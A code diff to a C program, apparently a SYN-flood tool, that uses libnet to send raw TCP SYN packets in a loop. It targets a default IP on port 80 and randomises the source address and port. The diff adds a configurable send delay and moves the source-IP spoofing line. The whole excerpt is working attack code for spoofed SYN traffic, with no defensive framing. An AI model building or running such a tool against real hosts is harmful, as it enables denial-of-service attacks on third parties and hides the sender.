@@ -24,13 +24,14 @@ int loopCount = 10;
 
 int main(int argc, char *argv[])
 {
-  char *cmds = "-i 219.217.228.102 ---- dst_ip\n-p 80 ---- dst_port\n-d wlp3s0 ---- device\n-l 10 ---- loopCount\n";
+  char *cmds = "-i 219.217.228.102 ---- dst_ip\n-p 80 ---- dst_port\n-d wlp3s0 ---- device\n-l 10 ---- loopCount\n-s 0.5 ---- send-syn delay\n";
   char ch;
   int i_len, d_len;
-	while ((ch = getopt(argc, argv, "i:p:d:l:")) != EOF /*-1*/) {
+  int s = 1;
+	while ((ch = getopt(argc, argv, "i:p:d:l:s:")) != EOF /*-1*/) {
 		// printf("optind: %d\n", optind);
    	switch (ch){
-				 case 'i': 
+				 case 'i':
 								 i_len = strlen(optarg)<15?strlen(optarg):15;
 								 strncpy(dst_ip_str, optarg, i_len);
 								 break;
@@ -44,6 +45,12 @@ int main(int argc, char *argv[])
          case 'l':
                  loopCount = atoi(optarg);
 								 break;
+         case 's':
+                 s = atof(optarg);
+                 if (s<0){
+                   s = 1;
+                 }
+								 break;
 				 default:
 				 				printf("%s", cmds);
 								return 0;
@@ -52,7 +59,7 @@ int main(int argc, char *argv[])
 	do
 	{
 		sendsyn();
-		sleep(1);
+		sleep(s);
     loopCount--;
 	}while(loopCount>0);
 
@@ -91,7 +98,7 @@ void sendsyn(){
 	src_ip = libnet_name2addr4(lib_net,src_ip_str,LIBNET_RESOLVE);	//将字符串类型的ip转换为顺序网络字节流
   // srand(time(NULL));
   // src_ip = rand()%2e9;
-  src_ip |= ((rand() % 0xffff)<<16);
+  // src_ip |= ((rand() % 0xffff)<<16);
 	dst_ip = libnet_name2addr4(lib_net,dst_ip_str,LIBNET_RESOLVE);
 /*
 libnet_ptag_t libnet_build_tcp(u_int16_t sp, u_int16_t dp,u_int32_t seq, u_int32_t ack,u_int8_t control, u_int16_t win,u_int16_t sum, u_int16_t urg,u_int16_t len, u_int8_t *payload,u_int32_t payload_s, libnet_t *l,libnet_ptag_t ptag );
@@ -114,7 +121,7 @@ ptag：协议标记，第一次组新的发送包时，这里写 0，同一个�
 失败：-1
 */
   src_port = rand()%65535;
-	lib_t = libnet_build_tcp(	//构造udp数据包
+	lib_t = libnet_build_tcp(	//构造tcp数据包
 								src_port, // src_port
 								dst_port, // dst_port
                 0x6fa13d27&(rand()%0xff), // seq
@@ -135,7 +142,7 @@ ptag：协议标记，第一次组新的发送包时，这里写 0，同一个�
   //       printf("libnet_build_tcp failure\n");
   //       return (-3);
   //   };
-
+  src_ip |= ((rand() % 0xffff)<<16);
 	lib_t = libnet_build_ipv4(	//构造ip数据包
 								40,
 								0,
